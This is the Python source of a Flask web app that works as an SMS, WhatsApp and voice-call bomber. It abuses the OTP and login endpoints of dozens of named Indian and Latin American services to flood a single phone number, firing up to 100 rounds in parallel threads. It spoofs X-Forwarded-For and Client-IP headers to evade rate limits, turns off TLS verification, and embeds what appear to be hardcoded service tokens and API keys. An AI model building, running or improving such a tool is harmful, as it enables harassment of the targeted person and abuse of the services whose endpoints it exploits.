import json
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template, request, jsonify, Response, stream_with_context
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

def random_ip():
    return f"{random.randint(1, 222)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

MOBILE_UA = "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
CHROME_UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"

def do_request(name, method, url, **kwargs):
    ip = random_ip()
    headers = kwargs.pop("headers", {})
    headers["X-Forwarded-For"] = ip
    headers["Client-IP"] = ip
    try:
        resp = requests.request(
            method, url,
            headers=headers,
            timeout=10,
            allow_redirects=True,
            verify=False,
            **kwargs
        )
        return {"name": name, "status": resp.status_code, "ok": resp.status_code < 400}
    except Exception as e:
        return {"name": name, "status": 0, "ok": False, "error": str(e)}


# ──────────────────────────────────────────────
# SMS API callers
# ──────────────────────────────────────────────

def sms_newme(phone):
    return do_request("NewMe Asia", "POST",
        "https://prodapi.newme.asia/web/otp/request",
        headers={"Content-Type": "application/json", "Origin": "https://newme.asia",
                 "Referer": "https://newme.asia/", "User-Agent": CHROME_UA},
        json={"mobile_number": phone, "resend_otp_request": True}
    )

def sms_univest(phone):
    return do_request("Univest", "GET",
        f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        headers={"Host": "api.univest.in", "User-Agent": "okhttp/3.9.1", "Accept-Encoding": "gzip"}
    )

def sms_limeroad(phone):
    return do_request("LimeRoad", "POST",
        "https://www.limeroad.com/auth/resend_otp",
        headers={"Content-Type": "application/json", "Origin": "https://www.limeroad.com",
                 "Referer": "https://www.limeroad.com/auth/login", "User-Agent": MOBILE_UA},
        json={"user_id": phone, "ruid": "70e45bb5-ef00-4682-829e-84b41556a9e7"}
    )

def sms_foxy(phone):
    return do_request("Foxy.in", "POST",
        "https://www.foxy.in/api/v2/users/send_otp",
        headers={"Content-Type": "application/json", "Origin": "https://www.foxy.in",
                 "Referer": "https://www.foxy.in/onboarding", "User-Agent": MOBILE_UA,
                 "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be"},
        json={"guest_token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
              "user": {"phone_number": f"+91{phone}"}, "device": None, "invite_code": ""}
    )

def sms_ekacare(phone):
    return do_request("Eka Care", "POST",
        "https://auth.eka.care/auth/init",
        headers={"Content-Type": "application/json; charset=UTF-8", "Device-Id": "5df83c463f0ff8ff",
                 "Flavour": "android", "Client-Id": "androidp", "User-Agent": "okhttp/4.9.3"},
        json={"payload": {"allowWhatsapp": True, "mobile": f"+91{phone}"}, "type": "mobile"}
    )

def sms_smytten(phone):
    return do_request("Smytten", "POST",
        "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        headers={"Content-Type": "application/json", "Origin": "https://smytten.com",
                 "Referer": "https://smytten.com/", "User-Agent": MOBILE_UA},
        json={"ad_id": "", "device_info": {}, "device_id": "", "app_version": "",
              "device_token": "", "device_platform": "web", "phone": phone,
              "email": "user@example.com"}
    )

def sms_citymall(phone):
    return do_request("CityMall", "POST",
        "https://cf.citymall.live/api/cl-user/auth/get-otp",
        headers={"Content-Type": "application/json", "accept": "application/json, text/plain, */*",
                 "x-app-name": "CX", "x-app-version": "1.42.2", "x-platform-os": "android",
                 "user-agent": "okhttp/4.9.2"},
        json={"phone_number": phone, "unique_device_id": "c095ed5e5e9c8541",
              "cl_user_id": None, "source": "app", "otpEscape": True}
    )

def sms_shadowfax(phone):
    return do_request("Shadowfax", "POST",
        "https://api.shadowfax.in/delivery/otp/send/v2/",
        headers={"Content-Type": "application/json; charset=utf-8",
                 "authorization": "Token OR1ZPU7MXE5OYTNQM2UYG320XDUSFFOQOVEFZZXT291G96AEFU2J7EI2DBDL",
                 "user-agent": "okhttp/4.12.0", "accept-encoding": "gzip"},
        json={"mobile_number": phone}
    )

def sms_2factor(phone):
    return do_request("2Factor", "GET",
        f"https://2factor.in/API/V1/7ce280d5-97e3-4811-aaae-69bdd2206489/SMS/{phone}/AUTOGEN",
        headers={"Host": "2factor.in", "user-agent": "okhttp/4.9.0"}
    )

def sms_unacademy(phone):
    return do_request("Unacademy", "POST",
        "https://api.unacademy.com/v3/user/user_check/?enable-email=true",
        headers={"Content-Type": "application/json; charset=UTF-8",
                 "user-agent": "UnacademyLearningAppAndroid/6.148.0 Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)"},
        json={"country_code": "IN", "phone": phone, "send_otp": True, "otp_type": 1,
              "app_hash": "uI6w7mnt583"}
    )

def sms_confirmtkt(phone):
    return do_request("ConfirmTkt", "GET",
        f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}&newOtp=true&retry=false&testparamsp=true",
        headers={"User-Agent": MOBILE_UA, "Host": "securedapi.confirmtkt.com"}
    )

def sms_chemist180(phone):
    return do_request("Chemist180", "POST",
        "https://api.chemist180.com/api/customer/send-verification-code",
        headers={"Content-Type": "application/json", "Origin": "https://chemist180.com",
                 "Referer": "https://chemist180.com/", "User-Agent": MOBILE_UA},
        json={"phone": phone}
    )

def sms_aakash(phone):
    return do_request("Aakash", "POST",
        "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        headers={"Content-Type": "application/json", "User-Agent": MOBILE_UA,
                 "Host": "antheapi.aakash.ac.in"},
        json={"mobile": phone}
    )

def sms_wakefit(phone):
    return do_request("Wakefit", "POST",
        "https://api.wakefit.co/api/consumer-sms-otp/",
        headers={"Content-Type": "application/json", "Origin": "https://www.wakefit.co",
                 "Referer": "https://www.wakefit.co/", "User-Agent": MOBILE_UA},
        json={"mobile": phone, "whatsapp_opt_in": 0}
    )

def sms_beepkart(phone):
    return do_request("BeepKart", "POST",
        "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        headers={"Content-Type": "application/json", "origin": "https://www.beepkart.com",
                 "referer": "https://www.beepkart.com/", "User-Agent": CHROME_UA},
        json={"phone": phone}
    )

def sms_nobroker(phone):
    return do_request("NoBroker", "POST",
        "https://www.nobroker.in/api/v3/account/otp/send",
        headers={"Content-Type": "application/json", "origin": "https://www.nobroker.in",
                 "referer": "https://www.nobroker.in/", "User-Agent": MOBILE_UA},
        json={"phone": phone}
    )

def sms_shiprocket(phone):
    return do_request("Shiprocket", "POST",
        "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        headers={"Content-Type": "application/json", "origin": "https://app.shiprocket.in",
                 "referer": "https://app.shiprocket.in/", "User-Agent": CHROME_UA},
        json={"mobileNumber": phone}
    )

def sms_gokwik(phone):
    return do_request("GoKwik", "POST",
        "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers={"Content-Type": "application/json", "origin": "https://pdp.gokwik.co",
                 "referer": "https://pdp.gokwik.co/", "User-Agent": CHROME_UA},
        json={"mobile": phone, "shopifyCheckout": False}
    )

def sms_vedantu(phone):
    return do_request("Vedantu", "POST",
        "https://user.vedantu.com/user/preLoginVerification",
        headers={"Content-Type": "application/json; charset=utf-8", "Host": "user.vedantu.com",
                 "User-Agent": "okhttp/4.9.2"},
        json={"phoneCode": "+91", "phoneNumber": phone, "event": "APP_FLOW", "sType": "VEDANTU_A_1_APP"}
    )

def sms_testbook(phone):
    return do_request("Testbook", "POST",
        "https://api.testbook.com/api/v2/otp/send",
        headers={"Content-Type": "application/json", "Host": "api.testbook.com",
                 "User-Agent": "okhttp/4.9.1"},
        json={"phone": phone, "dial_code": "+91"}
    )

def sms_bewakoof(phone):
    return do_request("Bewakoof", "POST",
        "https://api-prod.bewakoof.com/v3/user/auth/login/otp",
        headers={"Content-Type": "application/json; charset=utf-8",
                 "access-control-allow-origin": "*", "User-Agent": MOBILE_UA},
        json={"phone": phone, "country_code": "+91"}
    )

def sms_lenskart(phone):
    return do_request("Lenskart", "POST",
        "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        headers={"Content-Type": "application/json", "Origin": "https://www.lenskart.com",
                 "Referer": "https://www.lenskart.com/", "User-Agent": MOBILE_UA},
        json={"mobile": phone, "countryCode": "+91", "isWhatsapp": False}
    )

def sms_shemaroome(phone):
    return do_request("SheMaroOme", "POST",
        "https://www.shemaroome.com/users/resend_otp",
        headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                 "Origin": "https://www.shemaroome.com",
                 "Referer": "https://www.shemaroome.com/users/sign_in",
                 "User-Agent": MOBILE_UA},
        data=f"mobile_no=%2B91{phone}"
    )

def sms_bikefixup(phone):
    return do_request("BikeFixup", "POST",
        "https://api.bikefixup.com/api/v2/send-registration-otp",
        headers={"Content-Type": "application/json; charset=UTF-8", "accept": "application/json",
                 "user-agent": "Dart/3.6 (dart:io)"},
        json={"phone": phone, "app_signature": "4pFtQJwcz6y"}
    )

def sms_stratzy(phone):
    return do_request("Stratzy", "POST",
        "https://stratzy.in/api/web/auth/sendPhoneOTP",
        headers={"Content-Type": "application/json", "origin": "https://stratzy.in",
                 "referer": "https://stratzy.in/login", "User-Agent": CHROME_UA},
        json={"phoneNo": phone}
    )

def sms_1mg(phone):
    return do_request("1mg", "POST",
        "https://www.1mg.com/auth_api/v6/create_token",
        headers={"Content-Type": "application/json", "User-Agent": MOBILE_UA},
        json={"login_type": "PHONE", "phone_number": phone, "country_code": "+91"}
    )

def sms_doubtnut(phone):
    return do_request("DoubtNut", "POST",
        "https://api.doubtnut.com/v4/student/login",
        headers={"Content-Type": "application/json", "version_code": "1160",
                 "User-Agent": MOBILE_UA},
        json={"phone_number": phone, "locale": "en"}
    )

def sms_housing(phone):
    return do_request("Housing.com", "POST",
        "https://mightyzeus.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_LOGIN&isBot=false&source=mobile",
        headers={"Content-Type": "application/json", "User-Agent": MOBILE_UA},
        json={"query": "mutation($email: String, $phone: String) { sendOtp(phone: $phone, email: $email) { success message } }",
              "variables": {"phone": phone}}
    )

def sms_apna(phone):
    return do_request("Apna.co", "POST",
        "https://production.apna.co/api/userprofile/v1/otp/",
        headers={"Content-Type": "application/json", "User-Agent": MOBILE_UA},
        json={"mobile": phone, "country_code": "+91"}
    )

def sms_dream11(phone):
    return do_request("Dream11", "POST",
        "https://www.dream11.com/auth/passwordless/init",
        headers={"Content-Type": "application/json", "User-Agent": CHROME_UA,
                 "origin": "https://www.dream11.com"},
        json={"identity": phone, "type": "phone"}
    )

def sms_rapido(phone):
    return do_request("Rapido", "POST",
        "https://customer.rapido.bike/api/otp",
        headers={"Content-Type": "application/json", "User-Agent": MOBILE_UA},
        json={"phoneNumber": f"+91{phone}"}
    )

def sms_khatabook(phone):
    return do_request("KhataBook", "POST",
        "https://api.khatabook.com/v1/auth/request-otp",
        headers={"Content-Type": "application/json", "User-Agent": MOBILE_UA},
        json={"mobile": phone, "countryCode": "91"}
    )

def sms_hungama(phone):
    return do_request("Hungama", "POST",
        "https://communication.api.hungama.com/v1/communication/otp",
        headers={"Content-Type": "application/json", "User-Agent": MOBILE_UA},
        json={"phoneNumber": phone, "countryCode": "91"}
    )

def sms_snapdeal(phone):
    return do_request("Snapdeal", "POST",
        "https://m.snapdeal.com/sendOTP",
        headers={"Content-Type": "application/json", "User-Agent": MOBILE_UA,
                 "origin": "https://m.snapdeal.com"},
        json={"phoneNumber": phone}
    )

def sms_kreditbee(phone):
    return do_request("KreditBee", "POST",
        "https://api.kreditbee.in/v1/me/otp",
        headers={"Content-Type": "application/json",
                 "origin": "https://mix.kreditbee.in",
                 "referer": "https://mix.kreditbee.in/loginwithmob/mobileform",
                 "User-Agent": MOBILE_UA},
        json={"phone": phone, "country_code": "+91"}
    )

def sms_snitch(phone):
    return do_request("Snitch", "POST",
        "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        headers={"Content-Type": "application/json", "Origin": "https://www.snitch.com",
                 "Referer": "https://www.snitch.com/", "User-Agent": CHROME_UA},
        json={"mobile_number": f"+91{phone}"}
    )

def sms_refyne(phone):
    return do_request("Refyne", "POST",
        "https://prod-api.refyne.co.in/auth/v2/send-otp",
        headers={"Content-Type": "application/json", "User-Agent": MOBILE_UA},
        json={"mobile": phone, "countryCode": "+91"}
    )

def sms_nuvama(phone):
    return do_request("Nuvama Wealth", "POST",
        "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
        headers={"Content-Type": "application/json", "User-Agent": MOBILE_UA},
        json={"mobileNumber": phone}
    )

def sms_entri(phone):
    return do_request("Entri App", "GET",
        f"https://entri.app/api/v3/users/check-phone/{phone}",
        headers={"User-Agent": MOBILE_UA, "accept": "application/json"}
    )

# ──────────────────────────────────────────────
# WhatsApp API callers
# ──────────────────────────────────────────────

def wa_rappi_mx(phone):
    return do_request("Rappi MX (WA)", "POST",
        "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        headers={"Content-Type": "application/json; charset=utf-8",
                 "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
                 "Accept": "application/json"},
        json={"country_code": "+91", "phone": phone}
    )

def wa_rappi(phone):
    return do_request("Rappi (WA)", "POST",
        "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        headers={"Content-Type": "application/json",
                 "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
                 "Accept": "application/json"},
        json={"phone": phone, "country_code": "+91"}
    )

def wa_foxy(phone):
    return do_request("Foxy.in (WA)", "POST",
        "https://www.foxy.in/api/v2/users/send_otp",
        headers={"Content-Type": "application/json", "Origin": "https://www.foxy.in",
                 "Referer": "https://www.foxy.in/onboarding", "User-Agent": MOBILE_UA,
                 "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be"},
        json={"user": {"phone_number": f"+91{phone}"}, "via": "whatsapp"}
    )

def wa_jockey(phone):
    return do_request("Jockey (WA)", "GET",
        f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        headers={"User-Agent": MOBILE_UA, "Referer": "https://www.jockey.in/"}
    )

def wa_kpnfresh(phone):
    return do_request("KPN Fresh (WA)", "POST",
        "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        headers={"Content-Type": "application/json; charset=UTF-8",
                 "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
                 "user-agent": "okhttp/5.0.0-alpha.11"},
        json={"notification_channel": "WHATSAPP",
              "phone_number": {"country_code": "+91", "number": phone}}
    )

def wa_stratzy(phone):
    return do_request("Stratzy (WA)", "POST",
        "https://stratzy.in/api/web/whatsapp/sendOTP",
        headers={"Content-Type": "application/json", "origin": "https://stratzy.in",
                 "User-Agent": CHROME_UA},
        json={"phoneNo": phone}
    )

def wa_justdial(phone):
    return do_request("JustDial (WA)", "GET",
        f"https://www.justdial.com/functions/whatsappverification.php?name=Hi&rsend=0&mob={phone}",
        headers={"User-Agent": MOBILE_UA, "Referer": "https://www.justdial.com/"}
    )

def wa_wakefit(phone):
    return do_request("Wakefit (WA)", "POST",
        "https://api.wakefit.co/api/consumer-sms-otp/",
        headers={"Content-Type": "application/json", "Origin": "https://www.wakefit.co",
                 "Referer": "https://www.wakefit.co/", "User-Agent": MOBILE_UA},
        json={"mobile": phone, "whatsapp_opt_in": 1}
    )

def wa_lenskart(phone):
    return do_request("Lenskart (WA)", "POST",
        "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        headers={"Content-Type": "application/json", "Origin": "https://www.lenskart.com",
                 "Referer": "https://www.lenskart.com/", "User-Agent": MOBILE_UA},
        json={"mobile": phone, "countryCode": "+91", "isWhatsapp": True}
    )

def wa_penpencil(phone):
    return do_request("PenPencil (WA)", "GET",
        f"https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        headers={"User-Agent": MOBILE_UA, "phoneNumber": phone, "countryCode": "+91"}
    )

# ──────────────────────────────────────────────
# Call/Voice OTP API callers
# ──────────────────────────────────────────────

def call_tatacapital(phone):
    return do_request("Tata Capital (Call)", "POST",
        "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        headers={"Content-Type": "application/json", "User-Agent": MOBILE_UA},
        json={"mobile": phone, "isOtpViaCallAtLogin": "true"}
    )

def call_swiggy(phone):
    return do_request("Swiggy (Call)", "POST",
        "https://profile.swiggy.com/api/v3/app/request_call_verification",
        headers={"Content-Type": "application/json; charset=utf-8",
                 "user-agent": "Swiggy-Android", "pl-version": "55",
                 "app-version": "4.38.1", "accept": "application/json; charset=utf-8"},
        json={"mobile": phone}
    )

def call_apollo247(phone):
    return do_request("Apollo247 (Call)", "POST",
        "https://apigateway.apollo247.in/auth-service/getOTPOnCall",
        headers={"Content-Type": "application/json", "accept": "application/json, text/plain, */*",
                 "x-app-os": "android", "x-app-version": "7.14.1",
                 "x-apollo247-api-key": "sample_api_key",
                 "origin": "https://www.apollo247.com",
                 "user-agent": "okhttp/4.11.0"},
        json={"id": "b872dfa3-e62f-4173-a9c9-4ca74b4f3b5d", "loginType": "PATIENT",
              "mobileNumber": f"+91{phone}"}
    )

def call_doubtnut(phone):
    return do_request("DoubtNut (Call)", "POST",
        "https://micro.doubtnut.com/otp/send-call",
        headers={"Content-Type": "application/json; charset=utf-8",
                 "version_code": "1260", "user-agent": "okhttp/4.0.0-alpha.2",
                 "android_sdk_version": "29"},
        json={"phone": phone, "locale": "en"}
    )

def call_snitch(phone):
    return do_request("Snitch (Call)", "POST",
        "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/resend/voice",
        headers={"Content-Type": "application/json; charset=utf-8",
                 "Origin": "https://www.snitch.com", "Referer": "https://www.snitch.com/",
                 "User-Agent": CHROME_UA},
        json={"mobile_number": f"+91{phone}"}
    )

def call_penpencil(phone):
    return do_request("PenPencil (Call)", "GET",
        f"https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        headers={"User-Agent": MOBILE_UA, "phoneNumber": phone, "countryCode": "+91"}
    )

def call_vedantu(phone):
    return do_request("Vedantu (Call)", "POST",
        "https://user.vedantu.com/user/preLoginVerification",
        headers={"Content-Type": "application/json; charset=utf-8", "Host": "user.vedantu.com",
                 "User-Agent": "okhttp/4.9.2"},
        json={"phoneCode": "+91", "phoneNumber": phone, "event": "RESEND_OTP_CALL", "sType": "VEDANTU_A_1_APP"}
    )

def call_servetel(phone):
    return do_request("Servetel (Call)", "POST",
        "https://api.servetel.in/v1/auth/otp",
        headers={"Content-Type": "application/json", "User-Agent": MOBILE_UA},
        json={"mobile": phone, "type": "voice"}
    )

def call_docprime(phone):
    return do_request("DocPrime (Call)", "POST",
        "https://docon.co.in/api/v1/user/online-login",
        headers={"Content-Type": "application/json", "User-Agent": MOBILE_UA},
        json={"mobile": phone, "via": "call"}
    )


# ──────────────────────────────────────────────
# API registry
# ──────────────────────────────────────────────

SMS_APIS = [
    sms_newme, sms_univest, sms_limeroad, sms_foxy, sms_ekacare,
    sms_smytten, sms_citymall, sms_shadowfax, sms_2factor, sms_unacademy,
    sms_confirmtkt, sms_chemist180, sms_aakash, sms_wakefit, sms_beepkart,
    sms_nobroker, sms_shiprocket, sms_gokwik, sms_vedantu, sms_testbook,
    sms_bewakoof, sms_lenskart, sms_shemaroome, sms_bikefixup, sms_stratzy,
    sms_1mg, sms_doubtnut, sms_housing, sms_apna, sms_dream11, sms_rapido,
    sms_khatabook, sms_hungama, sms_snapdeal, sms_kreditbee, sms_snitch,
    sms_refyne, sms_nuvama, sms_entri,
]

WA_APIS = [
    wa_rappi_mx, wa_rappi, wa_foxy, wa_jockey, wa_kpnfresh,
    wa_stratzy, wa_justdial, wa_wakefit, wa_lenskart, wa_penpencil,
]

CALL_APIS = [
    call_tatacapital, call_swiggy, call_apollo247, call_doubtnut, call_snitch,
    call_penpencil, call_vedantu, call_servetel, call_docprime,
]

API_MAP = {
    "sms": SMS_APIS,
    "whatsapp": WA_APIS,
    "call": CALL_APIS,
}


# ──────────────────────────────────────────────
# Routes
# ──────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/send", methods=["POST"])
def send():
    data = request.get_json()
    phone = str(data.get("phone", "")).strip()
    mode = data.get("mode", "sms").lower()
    count = int(data.get("count", 1))

    if not phone.isdigit() or len(phone) != 10:
        return jsonify({"error": "Enter a valid 10-digit phone number"}), 400
    if mode not in API_MAP:
        return jsonify({"error": "Invalid mode"}), 400
    if count < 1 or count > 100:
        return jsonify({"error": "Count must be between 1 and 100"}), 400

    apis = API_MAP[mode]

    def generate():
        total = len(apis) * count
        done = 0
        yield f"data: {json.dumps({'type': 'start', 'total': total, 'mode': mode})}\n\n"

        for _ in range(count):
            with ThreadPoolExecutor(max_workers=20) as pool:
                futures = {pool.submit(api, phone): api.__name__ for api in apis}
                for future in as_completed(futures):
                    result = future.result()
                    done += 1
                    result["done"] = done
                    result["total"] = total
                    yield f"data: {json.dumps(result)}\n\n"

        yield f"data: {json.dumps({'type': 'done', 'total': total})}\n\n"

    return Response(
        stream_with_context(generate()),
        mimetype="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
        }
    )

@app.route("/api/info")
def info():
    return jsonify({
        "sms": len(SMS_APIS),
        "whatsapp": len(WA_APIS),
        "call": len(CALL_APIS),
    })

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
